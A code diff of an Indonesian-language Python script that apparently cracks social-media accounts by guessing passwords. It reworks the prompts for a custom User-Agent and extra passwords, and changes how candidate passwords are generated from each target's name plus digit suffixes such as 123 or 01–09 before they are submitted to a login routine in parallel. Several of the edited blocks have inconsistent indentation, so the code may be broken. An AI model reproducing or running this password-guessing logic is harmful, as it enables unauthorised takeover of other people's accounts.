@@ -1165,17 +1165,17 @@ def atur_duluh():
 		xbz.append('metodh1')
 	else:
 		xbz.append('metodh1')
-	print(f'{xxx}─────────────────────────────')
-	print('└── tambahkan ua y atau t')
-	uatambah = input(f'└── : ')
+
+	cetak(panel(f'[bold white]Apakah Anda Ingin Mengunakan User-Agent Manual Untuk Melakukan Crack Account ? Y/T',width=90,title=f"[bold green]Setting User-Agent",style=f"bold white"))
+	uatambah = input(f' [+] Pilih : ')
 	if uatambah in ['y','Ya','ya','Y']:
 		ualuh.append('ya')
-		print(f'{xxx}─────────────────────────────')
-		bzer = input(f'└── ua : ')
+		bzer = input(f' [+] Masukan User-Agent : ')
 		ualu.append(bzer)
 	else:
 		ualuh.append('tidak')
-	pwplus=input('>> Tambahkan Password Manual ( Y/t ) ')
+		
+		pwplus=input('>> Tambahkan Password Manual ( Y/t ) ')
 	if pwplus in ['y','Y']:
 		pwpluss.append('ya')
 		cetak(nel('[[cyan]•[white]] Masukkan Katasandi Tambahan Minimal 6 Karakter\n[[cyan]•[white]] Contoh :[green] kakak,ngentod,adik[white] '))
@@ -1199,27 +1199,39 @@ def passwrdh():
 				pwv = []
 				pwt = []
 				if len(nmf)<6:
-					if len(frs)<3:
-						pass
-					else:
-						pwv.append(frs+'321')
-						pwv.append(frs+'123')
-						pwv.append(frs+'1234')
-						pwv.append(frs+'12345')
-						pwv.append(frs+'123456')
+					pass
 				else:
-					if len(frs)<3:
-						pwv.append(nmf)
-					else:
-						pwv.append(nmf)
-						pwv.append(frs+'321')
-						pwv.append(frs+'123')
-						pwv.append(frs+'1234')
-						pwv.append(frs+'12345')
-						pwv.append(frs+'123456')
-					if 'ya' in pwpluss:
-						for xpwd in pwnya:
-						pwv.append(xpwd)
+					pwv.append(nmf)
+					pwv.append(frs+'1')
+					pwv.append(frs+'2')
+					pwv.append(frs+'3')
+					pwv.append(frs+'00')
+					pwv.append(frs+'01')
+					pwv.append(frs+'02')
+					pwv.append(frs+'03')
+					pwv.append(frs+'04')
+					pwv.append(frs+'05')
+					pwv.append(frs+'06')
+					pwv.append(frs+'07')
+					pwv.append(frs+'08')
+					pwv.append(frs+'09')
+					pwv.append(frs+'12')
+					pwv.append(frs+'321')
+			else:
+				if len(frs)<3:
+					pwv.append(nmf)
+				else:
+					pwv.append(nmf)
+					pwv.append(frs+'12')
+					pwv.append(frs+'321')
+					pwv.append(frs+'123')
+					pwv.append(frs+'1234')
+					pwv.append(frs+'12345')
+					pwv.append(frs+'123456')
+
+			if 'ya' in pwpluss: 
+				for xpwd in pwnya:
+					pwv.append(xpwd)
 				else:pass
 				if 'metodh1' in xbz:
 					gas_krek.submit(metodh1,idf,pwv)
